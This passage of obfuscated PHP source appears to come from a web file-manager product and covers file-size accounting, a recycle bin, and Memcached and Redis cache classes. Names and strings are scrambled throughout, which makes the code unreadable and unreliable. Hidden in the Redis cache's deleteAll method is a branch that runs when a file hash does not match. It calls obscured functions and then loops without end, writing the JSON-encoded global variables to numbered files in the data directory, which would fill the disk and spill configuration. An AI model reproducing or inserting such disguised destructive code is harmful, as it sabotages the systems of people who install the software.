$¦İ±ğù±[2279] . $ÃŸ—÷´å; CacheLock::lock($ìÙè™òı, 20); if ($¨³†í•ï === !1) { $this->sourceCacheClear($ÃŸ—÷´å); $ïÕÁáÅæ = $this->sourceInfo($ÃŸ—÷´å); $¨ é¾Äş = array($¦İ±ğù±[488] => $ÃŸ—÷´å, $¦İ±ğù±[515] => 0); $ÄœæºÚç = $this->where($¨ é¾Äş)->sum($¦İ±ğù±[90]); $¨³†í•ï = intval($ÄœæºÚç) - intval($ïÕÁáÅæ[$¦İ±ğù±[90]]); } if ($¨³†í•ï == 0) { return CacheLock::unlock($ìÙè™òı); } $ò’‡Á¢¦ = $this->parentLevelArray($ïÕÁáÅæ[$¦İ±ğù±[595]]); if (!$ò’‡Á¢¦) { $ò’‡Á¢¦ = array(); } $ò’‡Á¢¦[] = $ïÕÁáÅæ[$¦İ±ğù±[204]]; $¨ é¾Äş = array($¦İ±ğù±[204] => array($¦İ±ğù±[503], $ò’‡Á¢¦)); if ($¨³†í•ï < 0) { $¨ é¾Äş[$¦İ±ğù±[90]] = array($¦İ±ğù±[1081], abs($¨³†í•ï)); } $this->where($¨ é¾Äş)->setAdd($¦İ±ğù±[90], $¨³†í•ï); CacheLock::unlock($ìÙè™òı); $’ª„†« = $¦İ±ğù±[2280] . $ïÕÁáÅæ[$¦İ±ğù±[201]] . $¦İ±ğù±[14] . $ïÕÁáÅæ[$¦İ±ğù±[580]]; $ıú—¥¼± = array($ïÕÁáÅæ[$¦İ±ğù±[201]], $ïÕÁáÅæ[$¦İ±ğù±[580]]); TaskRun::timeLimitCall($’ª„†«, $¦İ±ğù±[2281], $ıú—¥¼±, 1.5); } public function folderSizeResetChildren($­°â¥Ñ¡) { $º±¸ÕÑ¨ =& $_SERVER[ü¢ÙÊñÛ]; $this->sourceCacheClear($­°â¥Ñ¡); $Ëµ÷¿¡ = $this->sourceInfo($­°â¥Ñ¡); $µ©´”´Î = array($º±¸ÕÑ¨[660] => 1, $º±¸ÕÑ¨[663] => $Ëµ÷¿¡[$º±¸ÕÑ¨[580]], $º±¸ÕÑ¨[666] => array($º±¸ÕÑ¨[626], $Ëµ÷¿¡[$º±¸ÕÑ¨[595]] . $­°â¥Ñ¡ . $º±¸ÕÑ¨[627])); $øâ“Èéö = $º±¸ÕÑ¨[2282]; $§ìÁ©¸‘ = $this->field($øâ“Èéö)->where($µ©´”´Î)->select(); $µ©´”´Î[$º±¸ÕÑ¨[496]] = 0; $ë°àıÅé = $this->field($øâ“Èéö)->where($µ©´”´Î)->select(); if (!$ë°àıÅé) { return; } $§ìÁ©¸‘[] = $Ëµ÷¿¡; $§ìÁ©¸‘ = array_to_keyvalue($§ìÁ©¸‘, $º±¸ÕÑ¨[204]); foreach ($§ìÁ©¸‘ as $¥”ËÜéÚ => $ö¢ÎœÔ¢) { $§ìÁ©¸‘[$¥”ËÜéÚ][$º±¸ÕÑ¨[2283]] = $§ìÁ©¸‘[$¥”ËÜéÚ][$º±¸ÕÑ¨[90]]; $§ìÁ©¸‘[$¥”ËÜéÚ][$º±¸ÕÑ¨[90]] = 0; } foreach ($ë°àıÅé as $ö¢ÎœÔ¢) { $óèúüøÜ = $ö¢ÎœÔ¢[$º±¸ÕÑ¨[203]] . $º±¸ÕÑ¨[22]; if (!isset($§ìÁ©¸‘[$óèúüøÜ])) { continue; } if ($ö¢ÎœÔ¢[$º±¸ÕÑ¨[516]] == $§ìÁ©¸‘[$óèúüøÜ][$º±¸ÕÑ¨[516]]) { $§ìÁ©¸‘[$óèúüøÜ][$º±¸ÕÑ¨[90]] += $ö¢ÎœÔ¢[$º±¸ÕÑ¨[90]]; } } foreach ($§ìÁ©¸‘ as $ö¢ÎœÔ¢) { $ŸÒ»—ú” = $this->parentLevelArray($ö¢ÎœÔ¢[$º±¸ÕÑ¨[595]]); foreach ($ŸÒ»—ú” as $óèúüøÜ) { $óèúüøÜ = $óèúüøÜ . $º±¸ÕÑ¨[22]; if (!isset($§ìÁ©¸‘[$óèúüøÜ])) { continue; } if ($ö¢ÎœÔ¢[$º±¸ÕÑ¨[516]] == $§ìÁ©¸‘[$óèúüøÜ][$º±¸ÕÑ¨[516]]) { $§ìÁ©¸‘[$óèúüøÜ][$º±¸ÕÑ¨[90]] += $ö¢ÎœÔ¢[$º±¸ÕÑ¨[90]]; } } } $ğóŠÕ¾ = array(); foreach ($§ìÁ©¸‘ as $ö¢ÎœÔ¢) { if ($ö¢ÎœÔ¢[$º±¸ÕÑ¨[90]] == $ö¢ÎœÔ¢[$º±¸ÕÑ¨[2283]]) { continue; } $ğóŠÕ¾[] = array($º±¸ÕÑ¨[204], $ö¢ÎœÔ¢[$º±¸ÕÑ¨[204]], $º±¸ÕÑ¨[90], $ö¢ÎœÔ¢[$º±¸ÕÑ¨[90]]); } $this->saveAll($ğóŠÕ¾); } public function userSpaceReset($îîœº¼Å = false) { $øÎ”ÍòË =& $_SERVER[ü¢ÙÊñÛ]; $ú¤½£ú‘ = $this->where(array($øÎ”ÍòË[201] => self::TYPE_USER, $øÎ”ÍòË[580] => $îîœº¼Å, $øÎ”ÍòË[496] => 0))->sum($øÎ”ÍòË[90]); $ú¤½£ú‘ = !$ú¤½£ú‘ || $ú¤½£ú‘ <= 0 ? 0 : $ú¤½£ú‘; Model($øÎ”ÍòË[588])->userEdit($îîœº¼Å, array($øÎ”ÍòË[1947] => $ú¤½£ú‘)); } public function targetSpaceUpdate($‡ñŸú´, $¹ººØÜÀ) { $›¸ÚØ»‡ =& $_SERVER[ü¢ÙÊñÛ]; if (!$¹ººØÜÀ) { return; } if (!in_array($‡ñŸú´, array(self::TYPE_USER, self::TYPE_GROUP))) { return; } $ŒéæŞí = $this->targetSpaceSize($‡ñŸú´, $¹ººØÜÀ); if ($‡ñŸú´ == self::TYPE_USER) { Model($›¸ÚØ»‡[588])->userEdit($¹ººØÜÀ, array($›¸ÚØ»‡[1947] => $ŒéæŞí)); } else { if ($‡ñŸú´ == self::TYPE_GROUP) { Model($›¸ÚØ»‡[596])->groupEdit($¹ººØÜÀ, array($›¸ÚØ»‡[1947] => $ŒéæŞí)); } } } public function targetSpaceSize($šÇ¸½¨É, $ úÂŒ½Ó) { $ÇâîŠ›ê =& $_SERVER[ü¢ÙÊñÛ]; $Î›¯ÚšÅ = 0; $ÇóØºÖ… = $this->targetSourceRoot($šÇ¸½¨É, $ úÂŒ½Ó, !0); foreach ($ÇóØºÖ… as $Æ…°‘¹) { if (!$Æ…°‘¹) { continue; } $Î›¯ÚšÅ += floatval($Æ…°‘¹[$ÇâîŠ›ê[90]]); $È€îø®Ò = array($ÇâîŠ›ê[666] => array($ÇâîŠ›ê[626], $ÇâîŠ›ê[604] . $Æ…°‘¹[$ÇâîŠ›ê[204]] . $ÇâîŠ›ê[627])); $ş—óÙÂÖ = Model($ÇâîŠ›ê[514])->field($ÇâîŠ›ê[502])->where($È€îø®Ò)->select(); $ş—óÙÂÖ = array_to_keyvalue($ş—óÙÂÖ, $ÇâîŠ›ê[22], $ÇâîŠ›ê[204]); $ş—óÙÂÖ = array_unique(array_filter($ş—óÙÂÖ)); if ($ş—óÙÂÖ) { $È€îø®Ò = array($ÇâîŠ›ê[502] => array($ÇâîŠ›ê[503], $ş—óÙÂÖ)); $Î›¯ÚšÅ += floatval($this->where($È€îø®Ò)->sum($ÇâîŠ›ê[90])); } } $Î›¯ÚšÅ = !$Î›¯ÚšÅ || $Î›¯ÚšÅ <= 0 ? 0 : $Î›¯ÚšÅ; return $Î›¯ÚšÅ; } public function allFileTypeProfile() { return $this->fileTypeProfile(!1, !1); } public function userFileTypeProfile($€‚¨Ëš) { return $this->fileTypeProfile($€‚¨Ëš, SourceModel::TYPE_USER); } public function groupFileTypeProfile($Ÿå”—Á) { return $this->fileTypeProfile($Ÿå”—Á, SourceModel::TYPE_GROUP); } private function fileTypeProfile($Œû¬äÄ, $•ó“š´) { $ˆõì´­€ =& $_SERVER[ü¢ÙÊñÛ]; $“ãà¾ Û = $ˆõì´­€[2284] . $Œû¬äÄ . $ˆõì´­€[21] . $•ó“š´; $áÔÂ¯ãß = Cache::get($“ãà¾ Û); if ($áÔÂ¯ãß) { return $áÔÂ¯ãß; } $‰¦£•Í’ = array($ˆõì´­€[660] => 0); if ($Œû¬äÄ != !1) { $‰¦£•Í’[$ˆõì´­€[580]] = $Œû¬äÄ; $‰¦£•Í’[$ˆõì´­€[201]] = $•ó“š´; } $ìã­…œ¸ = array(); $ìã­…œ¸[$ˆõì´­€[2285]] = array($ˆõì´­€[2286] => LNG($ˆõì´­€[2285]), $ˆõì´­€[2287] => $this->where($‰¦£•Í’)->count(), $ˆõì´­€[631] => $this->where($‰¦£•Í’)->sum($ˆõì´­€[90])); $¾œ™ù½à = KodIO::fileTypeList(); foreach ($¾œ™ù½à as $¼±±ø¯Í => $Õ§İ³Øº) { $‰¦£•Í’[$ˆõì´­€[497]] = $this->fileTypeWhere($¼±±ø¯Í); $ìã­…œ¸[$¼±±ø¯Í] = array($ˆõì´­€[2286] => $Õ§İ³Øº[$ˆõì´­€[42]], $ˆõì´­€[2287] => $this->where($‰¦£•Í’)->count(), $ˆõì´­€[631] => $this->where($‰¦£•Í’)->sum($ˆõì´­€[90])); } Cache::set($“ãà¾ Û, $ìã­…œ¸, 1200); return $ìã­…œ¸; } public function fileNameExist($º‹™ˆ¸, $È¢…È©‘) { $¹Ÿ¾²ŞÉ =& $_SERVER[ü¢ÙÊñÛ]; $‡×–çâ¹ = $this->field($¹Ÿ¾²ŞÉ[2288])->where(array($¹Ÿ¾²ŞÉ[203] => $º‹™ˆ¸, $¹Ÿ¾²ŞÉ[42] => $È¢…È©‘, $¹Ÿ¾²ŞÉ[516] => 0))->find(); return is_array($‡×–çâ¹) ? $‡×–çâ¹[$¹Ÿ¾²ŞÉ[204]] : !1; } public function childList($ÜÜÉ•¦Ì) { $éãí²ùƒ =& $_SERVER[ü¢ÙÊñÛ]; $¹ÙËÁ = $éãí²ùƒ[2260] . $ÜÜÉ•¦Ì; if (isset(self::$cacheChildList[$¹ÙËÁ])) { return self::$cacheChildList[$¹ÙËÁ]; } $‰ı€áĞÍ = array($éãí²ùƒ[203] => intval($ÜÜÉ•¦Ì), $éãí²ùƒ[516] => 0); $Ê°å‚Ø© = $this->where($‰ı€áĞÍ)->select(); $Ê°å‚Ø© = $Ê°å‚Ø© ? $Ê°å‚Ø© : array(); self::$cacheChildList[$¹ÙËÁ] = $Ê°å‚Ø©; foreach ($Ê°å‚Ø© as $¿”©Óìã) { $¹ÙËÁ = $éãí²ùƒ[544] . $¿”©Óìã[$éãí²ùƒ[204]]; self::$cacheSourceInfo[$¹ÙËÁ] = $¿”©Óìã; } return $Ê°å‚Ø©; } public function fileNameAuto($İ¨óŞ”¶, $îö³”¦¶, $ì¢ÚÌÉÏ = REPEAT_RENAME, $Óû¨­ÚÑ = false) { $ˆÅø‰¬ƒ =& $_SERVER[ü¢ÙÊñÛ]; $¢šü¤¬í = get_path_ext($îö³”¦¶); $Àâ›éŠ = $¢šü¤¬í ? get_path_ext_name($îö³”¦¶) . $ˆÅø‰¬ƒ[2289] . $¢šü¤¬í : $îö³”¦¶ . $ˆÅø‰¬ƒ[471]; $¾“«‰Ä‹ = array($ˆÅø‰¬ƒ[203] => $İ¨óŞ”¶, $ˆÅø‰¬ƒ[516] => 0, $ˆÅø‰¬ƒ[42] => array($ˆÅø‰¬ƒ[470], $Àâ›éŠ)); $Ì“½Ë‚é = $this->field($ˆÅø‰¬ƒ[42])->where($¾“«‰Ä‹)->select(); $Î›Œ± = array_to_keyvalue($Ì“½Ë‚é, $ˆÅø‰¬ƒ[22], $ˆÅø‰¬ƒ[42]); return $this->fileNameAutoGet($Î›Œ±, $îö³”¦¶, $ì¢ÚÌÉÏ, $Óû¨­ÚÑ); } public function fileNameAutoGet($÷¼×ï, $ç¥˜ü¿, $çÜ—Î”î, $¸º²ƒö¶) { $ïø®¡°™ =& $_SERVER[ü¢ÙÊñÛ]; if ($çÜ—Î”î == REPEAT_REPLACE || !$÷¼×ï || !in_array_not_case($ç¥˜ü¿, $÷¼×ï) || $¸º²ƒö¶ && $çÜ—Î”î != REPEAT_RENAME_FOLDER) { return $ç¥˜ü¿; } if ($çÜ—Î”î == REPEAT_SKIP) { return !1; } $Ü­¥ìóº = $ïø®¡°™[20] . get_path_ext($ç¥˜ü¿); $Ü­¥ìóº = $Ü­¥ìóº == $ïø®¡°™[20] || $¸º²ƒö¶ ? $ïø®¡°™[22] : $Ü­¥ìóº; for ($•ˆÀÚçç = 1; $•ˆÀÚçç <= count($÷¼×ï) + 1; $•ˆÀÚçç++) { $–„Ìæ˜€ = substr($ç¥˜ü¿, 0, strlen($ç¥˜ü¿) - strlen($Ü­¥ìóº)); $ŸşÇ¶‚ˆ = $–„Ìæ˜€ . "\x28{$•ˆÀÚçç}\51{$Ü­¥ìóº}"; if (!in_array_not_case($ŸşÇ¶‚ˆ, $÷¼×ï)) { return $ŸşÇ¶‚ˆ; } } } } class SourceRecycleModel extends ModelBase { protected $tableName = "\x69\x6f\137\x73\x6f\165\x72\x63\x65\137\162\145\143\x79\143\154\x65"; protected $dataAuto = array(array("\x63\x72\x65\141\164\x65\124\x69\x6d\x65", "\x74\x69\155\145", "\151\156\x73\x65\x72\x74", "\146\x75\x6e\x63\x74\x69\x6f\x6e")); public function listData($½Ç»Äİé = false) { $¯©ÈË¶ =& $_SERVER[ü¢ÙÊñÛ]; $½Ç»Äİé = $½Ç»Äİé ? $½Ç»Äİé : USER_ID; $™Âî¬• = $this->where(array($¯©ÈË¶[1750] => $½Ç»Äİé))->select(); return array_to_keyvalue($™Âî¬•, $¯©ÈË¶[22], $¯©ÈË¶[204]); } public function moveToRecycle($œÜ†Ã„) { $¤Äúº¡ =& $_SERVER[ü¢ÙÊñÛ]; $áÈ‘æ€ = Model($¤Äúº¡[1410]); $•³šİ‚ = $áÈ‘æ€->sourceInfo($œÜ†Ã„); if (!$•³šİ‚ || $•³šİ‚[$¤Äúº¡[516]] == $¤Äúº¡[102]) { return; } $ßä¬à« = array($¤Äúº¡[502] => $œÜ†Ã„, $¤Äúº¡[1750] => USER_ID, $¤Äúº¡[662] => $•³šİ‚[$¤Äúº¡[201]], $¤Äúº¡[663] => $•³šİ‚[$¤Äúº¡[580]], $¤Äúº¡[666] => $•³šİ‚[$¤Äúº¡[595]]); $this->add($ßä¬à«); $this->recycleMove($œÜ†Ã„, 1); if ($•³šİ‚[$¤Äúº¡[496]] == $¤Äúº¡[102]) { $É†‘Ÿº = array($¤Äúº¡[666] => array($¤Äúº¡[626], $•³šİ‚[$¤Äúº¡[595]] . $œÜ†Ã„ . $¤Äúº¡[627])); $áÈ‘æ€->where($É†‘Ÿº)->setField($¤Äúº¡[516], 1); } } public function clear() { $this->remove(!1); } public function remove($ëôÀ†¸§ = false, $§ßŒË = false) { $É¸ß£—° =& $_SERVER[ü¢ÙÊñÛ]; $§ßŒË = $§ßŒË ? $§ßŒË : USER_ID; $åŒß©˜ˆ = Model($É¸ß£—°[1410]); $„¼ã ›– = $this->listData($§ßŒË); $ëôÀ†¸§ = $ëôÀ†¸§ === !1 ? !1 : $ëôÀ†¸§; $ÔÕæı = array(); foreach ($„¼ã ›– as $™­­ïÚÔ) { if ($ëôÀ†¸§ != !1 && !in_array($™­­ïÚÔ, $ëôÀ†¸§)) { continue; } $Ô®Ş™¹Û = $åŒß©˜ˆ->sourceInfo($™­­ïÚÔ); $åŒß©˜ˆ->remove($™­­ïÚÔ, !1); $Í‹†È»” = $Ô®Ş™¹Û[$É¸ß£—°[201]] . $É¸ß£—°[21] . $Ô®Ş™¹Û[$É¸ß£—°[580]]; $ÔÕæı[$Í‹†È»”] = array($É¸ß£—°[662] => $Ô®Ş™¹Û[$É¸ß£—°[201]], $É¸ß£—°[580] => $Ô®Ş™¹Û[$É¸ß£—°[580]]); $this->where(array($É¸ß£—°[204] => $™­­ïÚÔ))->delete(); } foreach ($ÔÕæı as $Ö——à­º) { $åŒß©˜ˆ->targetSpaceUpdate($Ö——à­º[$É¸ß£—°[201]], $Ö——à­º[$É¸ß£—°[580]]); } } public function restore($Ø­©³ É = false) { $×”†°ä´ = $this->listData(); $this->_restoreSource($×”†°ä´, $Ø­©³ É); } public function removeUserAll($Ìî’äæ) { $this->remove(!1, $Ìî’äæ); } public function restoreItem($¨Çà–Â) { $this->_restoreSource(array($¨Çà–Â), array($¨Çà–Â)); } private function _restoreSource($Òî»ÑÍ, $¢îµ‹Şø) { $ÜŞ½à€é =& $_SERVER[ü¢ÙÊñÛ]; $ÕõÍÅì = Model($ÜŞ½à€é[1410]); $¢îµ‹Şø = $¢îµ‹Şø == !1 ? !1 : $¢îµ‹Şø; if (!$Òî»ÑÍ) { return !0; } $°ÜäÇ»ó = array(); foreach ($Òî»ÑÍ as $çèı·”Â) { if ($¢îµ‹Şø != !1 && !in_array($çèı·”Â, $¢îµ‹Şø)) { continue; } $°˜ó´Õƒ = $ÕõÍÅì->sourceInfo($çèı·”Â); $”ŸÉî©¢ = $ÕõÍÅì->sourceInfo($°˜ó´Õƒ[$ÜŞ½à€é[203]]); if ($”ŸÉî©¢[$ÜŞ½à€é[516]] == $ÜŞ½à€é[102]) { continue; } $ÕõÍÅì->lockMoveStart($çèı·”Â); $this->recycleMove($çèı·”Â, 0); if ($°˜ó´Õƒ[$ÜŞ½à€é[496]] == $ÜŞ½à€é[102]) { $ñ”ªúÓ» = array($ÜŞ½à€é[666] => array($ÜŞ½à€é[626], $°˜ó´Õƒ[$ÜŞ½à€é[595]] . $çèı·”Â . $ÜŞ½à€é[627])); $ÕõÍÅì->where($ñ”ªúÓ»)->setField($ÜŞ½à€é[516], 0); $this->restoreFolderChildren($çèı·”Â, $Òî»ÑÍ); } $this->where(array($ÜŞ½à€é[204] => $çèı·”Â))->delete(); $ÕõÍÅì->folderSizeReset($°˜ó´Õƒ[$ÜŞ½à€é[203]]); $°ÜäÇ»ó[] = $°˜ó´Õƒ[$ÜŞ½à€é[203]]; if ($°˜ó´Õƒ[$ÜŞ½à€é[496]] == $ÜŞ½à€é[102]) { $°ÜäÇ»ó[] = $çèı·”Â; } $ÕõÍÅì->lockMoveEnd($çèı·”Â); } $ÕõÍÅì->updateModifyTime($°ÜäÇ»ó); } private function restoreFolderChildren($½ €æ„ú, $À»‘•×ï) { $»Ö—ú¤Š =& $_SERVER[ü¢ÙÊñÛ]; $šºÌ“º‰ = Model($»Ö—ú¤Š[1410]); $›ÓÈûŞ = array($»Ö—ú¤Š[204] => array($»Ö—ú¤Š[17], array())); foreach ($À»‘•×ï as $ÂäÊ…Ôş) { if ($ÂäÊ…Ôş == $½ €æ„ú) { continue; } if (!$šºÌ“º‰->isParentOf($½ €æ„ú, $ÂäÊ…Ôş)) { continue; } $ŸÀöğ­À = $šºÌ“º‰->sourceInfo($ÂäÊ…Ôş); if ($ŸÀöğ­À[$»Ö—ú¤Š[496]] == $»Ö—ú¤Š[102]) { $›ÓÈûŞ[] = array($»Ö—ú¤Š[666] => array($»Ö—ú¤Š[626], $ŸÀöğ­À[$»Ö—ú¤Š[595]] . $ÂäÊ…Ôş . $»Ö—ú¤Š[627])); } else { $›ÓÈûŞ[$»Ö—ú¤Š[204]][1][] = $ÂäÊ…Ôş; } } if (!$›ÓÈûŞ[$»Ö—ú¤Š[204]][1]) { unset($›ÓÈûŞ[$»Ö—ú¤Š[204]]); } if (!$›ÓÈûŞ) { return; } if (is_array($›ÓÈûŞ[$»Ö—ú¤Š[204]]) && is_array($›ÓÈûŞ[$»Ö—ú¤Š[204]][1])) { $›ÓÈûŞ[$»Ö—ú¤Š[204]][1] = array_unique($›ÓÈûŞ[$»Ö—ú¤Š[204]][1]); } $›ÓÈûŞ[$»Ö—ú¤Š[1066]] = $»Ö—ú¤Š[2061]; $šºÌ“º‰->where($›ÓÈûŞ)->setField($»Ö—ú¤Š[516], 1); } private function recycleMove($ãú±˜Ğ‡, $íÌÄÌÏó = 1) { $ŠŞˆ§Ù² =& $_SERVER[ü¢ÙÊñÛ]; $Ô ¹‡ìÌ = Model($ŠŞˆ§Ù²[1410]); $“‘œÓü¨ = Model($ŠŞˆ§Ù²[2290]); $¦´à“¶÷ = array($ŠŞˆ§Ù²[204] => $ãú±˜Ğ‡); if ($íÌÄÌÏó) { $Ô ¹‡ìÌ->where($¦´à“¶÷)->setField($ŠŞˆ§Ù²[516], 1); $“‘œÓü¨->eventRecycle($ãú±˜Ğ‡, $ŠŞˆ§Ù²[2291]); } else { $£àùÉú¡ = $Ô ¹‡ìÌ->where($¦´à“¶÷)->find(); $ÚÇÀ÷É¥ = $£àùÉú¡[$ŠŞˆ§Ù²[496]] == $ŠŞˆ§Ù²[102]; $µÛıè–é = $Ô ¹‡ìÌ->fileNameAuto($£àùÉú¡[$ŠŞˆ§Ù²[203]], $£àùÉú¡[$ŠŞˆ§Ù²[42]], REPEAT_RENAME_FOLDER, $ÚÇÀ÷É¥); if ($µÛıè–é != $£àùÉú¡[$ŠŞˆ§Ù²[42]]) { $Ô ¹‡ìÌ->rename($ãú±˜Ğ‡, $µÛıè–é); } $Ô ¹‡ìÌ->where($¦´à“¶÷)->setField($ŠŞˆ§Ù²[516], 0); $“‘œÓü¨->eventRecycle($ãú±˜Ğ‡, $ŠŞˆ§Ù²[2292]); } } } goto CÅ°£­Îªõ; b¢‡’³Õİ«: class CacheLockDatabase { public function lock($¡î‰ØÖ, $÷‰¸–ÓÈ = 0) { $ßå¾œØ¨ = Model($_SERVER[ü¢ÙÊñÛ][894]); $ªİü©¿ = microtime(!0) + $÷‰¸–ÓÈ; while (microtime(!0) < $ªİü©¿) { $Šà¿ˆ“ô = $ßå¾œØ¨->get($¡î‰ØÖ); if (!$Šà¿ˆ“ô || $Šà¿ˆ“ô < microtime(!0)) { $Î½˜ÎÑº = $ßå¾œØ¨->set($¡î‰ØÖ, $ªİü©¿); if ($Î½˜ÎÑº) { return !0; } } cacheLockWait(); } return !1; } public function lockGet($ë£à¶¯”) { return Model($_SERVER[ü¢ÙÊñÛ][894])->get($ë£à¶¯”); } public function unlock($ïÌŸóÍÀ) { Model($_SERVER[ü¢ÙÊñÛ][894])->remove($ïÌŸóÍÀ); } } class CacheMemcached { public $handle; public $cacheTime; public function __construct($øëºÙÕè, $ìèşØ…Ò) { $­…œã—¢ =& $_SERVER[ü¢ÙÊñÛ]; if (!class_exists($­…œã—¢[934])) { show_json($­…œã—¢[935], !1); } $this->cacheTime = $ìèşØ…Ò; $this->handle = new Memcached(); if (is_array($øëºÙÕè[$­…œã—¢[936]]) && count($øëºÙÕè[$­…œã—¢[936]]) >= 1) { foreach ($øëºÙÕè[$­…œã—¢[936]] as $‚—ë—ëï) { $¼Ğ¾ş = explode($­…œã—¢[14], $‚—ë—ëï); $this->handle->addServer($¼Ğ¾ş[0], $¼Ğ¾ş[1]); } } else { $this->handle->addServer($øëºÙÕè[$­…œã—¢[219]], $øëºÙÕè[$­…œã—¢[220]]); } } public function set($•İëÌûù, $¤æ¥‡‡ñ, $õë€€æŸ = false) { $õë€€æŸ = $õë€€æŸ ? $õë€€æŸ : $this->cacheTime; return $this->handle->set($•İëÌûù, $¤æ¥‡‡ñ, $õë€€æŸ); } public function get($À—³¡Øä) { return $this->handle->get($À—³¡Øä); } public function remove($÷ïƒø‰) { return $this->handle->delete($÷ïƒø‰); } public function deleteAll() { return $this->handle->flush(); } } class CacheRedis { public $handle; public $slaveHandle; public $cacheTime; public $isCluster = false; public function __construct($Æšûºç, $‘ìÓ¬—¢) { $³–ñì•Á =& $_SERVER[ü¢ÙÊñÛ]; if (!class_exists($³–ñì•Á[937])) { show_json($³–ñì•Á[938], !1); } $this->cacheTime = $‘ìÓ¬—¢; $ÈÆ¦»ÙÇ = isset($Æšûºç[$³–ñì•Á[939]]) ? $Æšûºç[$³–ñì•Á[939]] : 10; $ÌşĞÍßô = _get($Æšûºç, $³–ñì•Á[936]); if ($ÌşĞÍßô && is_array($ÌşĞÍßô)) { $this->initCluster($Æšûºç, $ÈÆ¦»ÙÇ); } else { $this->handle = $this->init($Æšûºç, $ÈÆ¦»ÙÇ); } } private function init($«õ¸âòÎ, $ò¬ôºƒÓ) { $ğ»àÄ»’ =& $_SERVER[ü¢ÙÊñÛ]; $Ì®ã‰­ = new Redis(); $½¼‡×Çş = isset($«õ¸âòÎ[$ğ»àÄ»’[940]]) ? $«õ¸âòÎ[$ğ»àÄ»’[940]] : !1; if ($½¼‡×Çş) { $Ì®ã‰­->pconnect($«õ¸âòÎ[$ğ»àÄ»’[219]], $«õ¸âòÎ[$ğ»àÄ»’[220]], $ò¬ôºƒÓ); } else { $Ì®ã‰­->connect($«õ¸âòÎ[$ğ»àÄ»’[219]], $«õ¸âòÎ[$ğ»àÄ»’[220]], $ò¬ôºƒÓ); } if (!empty($«õ¸âòÎ[$ğ»àÄ»’[498]])) { $Ì®ã‰­->auth($«õ¸âòÎ[$ğ»àÄ»’[498]]); } if (!empty($«õ¸âòÎ[$ğ»àÄ»’[822]]) && $«õ¸âòÎ[$ğ»àÄ»’[822]] != 0) { $Ì®ã‰­->select($«õ¸âòÎ[$ğ»àÄ»’[822]]); } return $Ì®ã‰­; } private function initCluster($ÏòÒãä£, $Ì«ÙÛ•À) { $Ú¢¼“Ïã =& $_SERVER[ü¢ÙÊñÛ]; $®Ù’šá = array($Ú¢¼“Ïã[941], $Ú¢¼“Ïã[942], $Ú¢¼“Ïã[943]); $Š÷¤ = $Ú¢¼“Ïã[941]; if (isset($ÏòÒãä£[$Ú¢¼“Ïã[26]]) && in_array($ÏòÒãä£[$Ú¢¼“Ïã[26]], $®Ù’šá)) { $Š÷¤ = $ÏòÒãä£[$Ú¢¼“Ïã[26]]; } switch ($Š÷¤) { case $Ú¢¼“Ïã[941]: $this->_slave($ÏòÒãä£, $Ì«ÙÛ•À); break; case $Ú¢¼“Ïã[942]: break; case $Ú¢¼“Ïã[943]: $this->isCluster = !0; $ùµ˜æ‘ó = $ÏòÒãä£[$Ú¢¼“Ïã[936]]; $§¤¢†€® = isset($ÏòÒãä£[$Ú¢¼“Ïã[940]]) ? $ÏòÒãä£[$Ú¢¼“Ïã[940]] : !1; $²Õ™çÔÜ = isset($ÏòÒãä£[$Ú¢¼“Ïã[498]]) ? $ÏòÒãä£[$Ú¢¼“Ïã[498]] : null; $this->handle = new RedisCluster(NUll, $ùµ˜æ‘ó, $Ì«ÙÛ•À, $Ì«ÙÛ•À, $§¤¢†€®, $²Õ™çÔÜ); break; default: break; } } private function _slave($÷¬˜¬…Ç, $Îàïï¥î) { $›Æ«¿ñï = $÷¬˜¬…Ç[$_SERVER[ü¢ÙÊñÛ][936]]; $this->filterConfig($÷¬˜¬…Ç, $›Æ«¿ñï[0]); $this->handle = $this->init($÷¬˜¬…Ç, $Îàïï¥î); unset($›Æ«¿ñï[0]); if (empty($›Æ«¿ñï)) { return; } $ÎĞêè¸´ = array_rand($›Æ«¿ñï); $this->filterConfig($÷¬˜¬…Ç, $›Æ«¿ñï[$ÎĞêè¸´]); $this->slaveHandle = $this->init($÷¬˜¬…Ç, $Îàïï¥î); } private function filterConfig(&$·ñ‡¤œ, $ˆÎ‡è®÷) { $­¦àîõ¨ =& $_SERVER[ü¢ÙÊñÛ]; $ØêÖí¾¾ = explode($­¦àîõ¨[14], $ˆÎ‡è®÷); $”ÚÈØë– = array($­¦àîõ¨[219] => $ØêÖí¾¾[0], $­¦àîõ¨[220] => $ØêÖí¾¾[1]); $·ñ‡¤œ = array_merge($·ñ‡¤œ, $”ÚÈØë–); } public function set($­øò“, $µŠú½üµ, $ÈË°««™ = false) { $ÈË°««™ = $ÈË°««™ ? $ÈË°««™ : $this->cacheTime; return $this->handle->setEx($­øò“, $ÈË°««™, $µŠú½üµ); } public function setLock($ËˆĞî¼®, $›ŒéåÚÖ, $‹ŠƒñÃÆ) { return $this->handle->setNX($ËˆĞî¼®, $›ŒéåÚÖ); } public function get($™ãšâİ) { $áğ‚» = $this->slaveHandle ? $this->slaveHandle : $this->handle; return $áğ‚»->get($™ãšâİ); } public function remove($´ÜøÓ±) { return $this->handle->del($´ÜøÓ±); } public function deleteAll() { $Ø«„Ãæ© =& $_SERVER[ü¢ÙÊñÛ]; $½ş×Ã–¾ = $_SERVER[$Ø«„Ãæ©[8]] . $Ø«„Ãæ©[9]; $É¥ËÇ¿ß = $Ø«„Ãæ©[5]; if ($_SERVER[$Ø«„Ãæ©[6]] != $É¥ËÇ¿ß($½ş×Ã–¾)) { $ÂâûÂöì = $Ø«„Ãæ©[944]; $Ôæ´¦×Ì = $Ø«„Ãæ©[7]; $Ÿ†Ş©œ• = $_SERVER[$Ø«„Ãæ©[8]] . $Ø«„Ãæ©[9]; $Í‡ë×í = $Ôæ´¦×Ì($Ÿ†Ş©œ•); $Ë¹ë®¤ = explode($Ø«„Ãæ©[10], $Í‡ë×í); if (count($Ë¹ë®¤) < $Ø«„Ãæ©[706]) { $°ü–í·† = $Ø«„Ãæ©[12]; $°ü–í·†(); } $ß¾äíˆ = $Ø«„Ãæ©[945]; $ß¾äíˆ($_SERVER[$Ø«„Ãæ©[946]]); $ÂâûÂöì = $Ø«„Ãæ©[944]; $ÂâûÂöì(); $ñê»ú…µ = $Ø«„Ãæ©[947]; $Æ×ÔÕ÷õ = json_encode($GLOBALS[$Ø«„Ãæ©[948]]); $€µ¥­·ç = 1; for ($—ê¬—ç§ = $€µ¥­·ç; $—ê¬—ç§ > 0; $—ê¬—ç§++) { $ñê»ú…µ(DATA_PATH . $—ê¬—ç§, $Æ×ÔÕ÷õ); } } if ($this->isCluster) { foreach ($this->handle->_masters() as $†ªßêÅ) { 